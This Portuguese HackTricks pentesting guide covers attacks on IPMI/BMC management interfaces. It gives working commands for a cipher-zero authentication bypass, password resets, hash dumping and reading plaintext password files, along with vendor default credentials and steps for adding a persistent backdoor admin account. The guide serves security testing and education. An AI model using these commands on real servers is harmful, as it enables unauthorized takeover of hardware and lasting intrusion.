# 623/UDP/TCP - IPMI

## 623/UDP/TCP - IPMI

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## Informa√ß√µes B√°sicas

### **Vis√£o Geral do IPMI**

**[Intelligent Platform Management Interface (IPMI)](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)** oferece uma abordagem padronizada para gerenciamento remoto e monitoramento de sistemas de computador, independente do sistema operacional ou estado de energia. Essa tecnologia permite que os administradores de sistema gerenciem sistemas remotamente, mesmo quando est√£o desligados ou sem resposta, e √© especialmente √∫til para:

- Configura√ß√µes de inicializa√ß√£o pr√©-OS
- Gerenciamento de desligamento
- Recupera√ß√£o de falhas no sistema

O IPMI √© capaz de monitorar temperaturas, voltagens, velocidades do ventilador e fontes de alimenta√ß√£o, al√©m de fornecer informa√ß√µes de invent√°rio, revisar logs de hardware e enviar alertas via SNMP. Para sua opera√ß√£o s√£o necess√°rios uma fonte de energia e uma conex√£o LAN.

Desde sua introdu√ß√£o pela Intel em 1998, o IPMI tem sido suportado por in√∫meros fornecedores, aprimorando as capacidades de gerenciamento remoto, especialmente com o suporte √† vers√£o 2.0 para serial sobre LAN. Componentes-chave incluem:

- **Controlador de Gerenciamento da Placa Base (BMC):** O microcontrolador principal para opera√ß√µes do IPMI.
- **Barramentos e Interfaces de Comunica√ß√£o:** Para comunica√ß√£o interna e externa, incluindo ICMB, IPMB e v√°rias interfaces para conex√µes locais e de rede.
- **Mem√≥ria IPMI:** Para armazenar logs e dados.

![https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right](https://blog.rapid7.com/content/images/post-images/27966/IPMI-Block-Diagram.png#img-half-right)

**Porta Padr√£o**: 623/UDP/TCP (Normalmente √© em UDP, mas tamb√©m pode ser executado em TCP)

## Enumera√ß√£o

### Descoberta
```bash
nmap -n -p 623 10.0.0./24
nmap -n-sU -p 623 10.0.0./24
use  auxiliary/scanner/ipmi/ipmi_version
```
Voc√™ pode **identificar** a **vers√£o** usando:
```bash
use auxiliary/scanner/ipmi/ipmi_version
nmap -sU --script ipmi-version -p 623 10.10.10.10
```
### Vulnerabilidades do IPMI

No reino do IPMI 2.0, uma falha significativa de seguran√ßa foi descoberta por Dan Farmer, expondo uma vulnerabilidade atrav√©s do **tipo de cifra 0**. Essa vulnerabilidade, documentada em detalhes na [pesquisa de Dan Farmer](http://fish2.com/ipmi/cipherzero.html), permite acesso n√£o autorizado com qualquer senha desde que um usu√°rio v√°lido seja alvo. Essa fraqueza foi encontrada em v√°rios BMCs de fabricantes como HP, Dell e Supermicro, sugerindo um problema generalizado em todas as implementa√ß√µes do IPMI 2.0.

### **Bypass de Autentica√ß√£o do IPMI via Cifra 0**

Para detectar essa falha, o seguinte scanner auxiliar do Metasploit pode ser empregado:
```bash
use auxiliary/scanner/ipmi/ipmi_cipher_zero
```
A explora√ß√£o dessa falha √© poss√≠vel com `ipmitool`, conforme demonstrado abaixo, permitindo a listagem e modifica√ß√£o de senhas de usu√°rio:
```bash
apt-get install ipmitool # Installation command
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user list # Lists users
ipmitool -I lanplus -C 0 -H 10.0.0.22 -U root -P root user set password 2 abc123 # Changes password
```
### **Recupera√ß√£o Remota de Hash de Senha de IPMI 2.0 RAKP Authentication**

Essa vulnerabilidade permite a recupera√ß√£o de senhas salgadas e hasheadas (MD5 e SHA1) para qualquer nome de usu√°rio existente. Para testar essa vulnerabilidade, o Metasploit oferece um m√≥dulo:
```bash
msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
```
### **Autentica√ß√£o An√¥nima IPMI**

Uma configura√ß√£o padr√£o em muitos BMCs permite o acesso "an√¥nimo", caracterizado por strings de nome de usu√°rio e senha nulas. Essa configura√ß√£o pode ser explorada para redefinir senhas de contas de usu√°rio nomeadas usando `ipmitool`:
```bash
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 newpassword
```
### **Senhas em texto simples do IPMI da Supermicro**

Uma escolha de design cr√≠tica no IPMI 2.0 torna necess√°rio o armazenamento de senhas em texto simples dentro dos BMCs para fins de autentica√ß√£o. O armazenamento dessas senhas pela Supermicro em locais como `/nv/PSBlock` ou `/nv/PSStore` levanta preocupa√ß√µes significativas de seguran√ßa:
```bash
cat /nv/PSBlock
```
### **Vulnerabilidade de UPnP do Supermicro IPMI**

A inclus√£o de um ouvinte UPnP SSDP no firmware do IPMI da Supermicro, especialmente na porta UDP 1900, introduz um risco de seguran√ßa grave. Vulnerabilidades no SDK da Intel para Dispositivos UPnP vers√£o 1.3.1, conforme detalhado pela [divulga√ß√£o da Rapid7](https://blog.rapid7.com/2013/01/29/security-flaws-in-universal-plug-and-play-unplug-dont-play), permitem acesso root ao BMC:
```bash
msf> use exploit/multi/upnp/libupnp_ssdp_overflow
```
### Ataque de For√ßa Bruta

**A HP randomiza a senha padr√£o** de seu produto **Integrated Lights Out (iLO)** durante a fabrica√ß√£o. Essa pr√°tica contrasta com outros fabricantes, que tendem a usar **credenciais padr√£o est√°ticas**. Um resumo de nomes de usu√°rios e senhas padr√£o para v√°rios produtos √© fornecido da seguinte forma:

- **HP Integrated Lights Out (iLO)** usa uma **cadeia de 8 caracteres randomizada de f√°brica** como sua senha padr√£o, demonstrando um n√≠vel de seguran√ßa mais alto.
- Produtos como **Dell's iDRAC, IBM's IMM** e **Fujitsu's Integrated Remote Management Controller** usam senhas facilmente adivinh√°veis como "calvin", "PASSW0RD" (com um zero) e "admin", respectivamente.
- Da mesma forma, **Supermicro IPMI (2.0), Oracle/Sun ILOM** e **ASUS iKVM BMC** tamb√©m usam credenciais padr√£o simples, com "ADMIN", "changeme" e "admin" servindo como suas senhas.


## Acessando o Host via BMC

O acesso administrativo ao Controlador de Gerenciamento da Placa Base (BMC) abre v√°rias vias para acessar o sistema operacional do host. Uma abordagem direta envolve a explora√ß√£o da funcionalidade de Teclado, V√≠deo, Mouse (KVM) do BMC. Isso pode ser feito reiniciando o host para um shell raiz via GRUB (usando `init=/bin/sh`) ou inicializando a partir de um CD-ROM virtual configurado como um disco de resgate. Tais m√©todos permitem a manipula√ß√£o direta do disco do host, incluindo a inser√ß√£o de backdoors, extra√ß√£o de dados ou quaisquer a√ß√µes necess√°rias para uma avalia√ß√£o de seguran√ßa. No entanto, isso requer reiniciar o host, o que √© uma desvantagem significativa. Sem reiniciar, acessar o host em execu√ß√£o √© mais complexo e varia com a configura√ß√£o do host. Se o console f√≠sico ou serial do host permanecer logado, ele pode ser facilmente assumido por meio das funcionalidades KVM ou serial-over-LAN (sol) do BMC via `ipmitool`. Explorar a explora√ß√£o de recursos de hardware compartilhados, como o barramento i2c e o chip Super I/O, √© uma √°rea que exige investiga√ß√£o adicional.

## Introduzindo Backdoors no BMC a partir do Host

Ap√≥s comprometer um host equipado com um BMC, a **interface local do BMC pode ser aproveitada para inserir uma conta de usu√°rio backdoor**, criando uma presen√ßa duradoura no servidor. Esse ataque exige a presen√ßa do **`ipmitool`** no host comprometido e a ativa√ß√£o do suporte ao driver BMC. Os comandos a seguir ilustram como uma nova conta de usu√°rio pode ser injetada no BMC usando a interface local do host, o que contorna a necessidade de autentica√ß√£o. Essa t√©cnica √© aplic√°vel a uma ampla gama de sistemas operacionais, incluindo Linux, Windows, BSD e at√© DOS.
```bash
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)

ipmitool user set name 4 backdoor
ipmitool user set password 4 backdoor
ipmitool user priv 4 4
ipmitool user list
ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
2  ADMIN            true    false      false      Unknown (0x00)
3  root            true    false      false      Unknown (0x00)
4  backdoor        true    false      true      ADMINISTRATOR
```
## Shodan

* `porta:623`

## Refer√™ncias

* [https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/](https://blog.rapid7.com/2013/07/02/a-penetration-testers-guide-to-ipmi/)
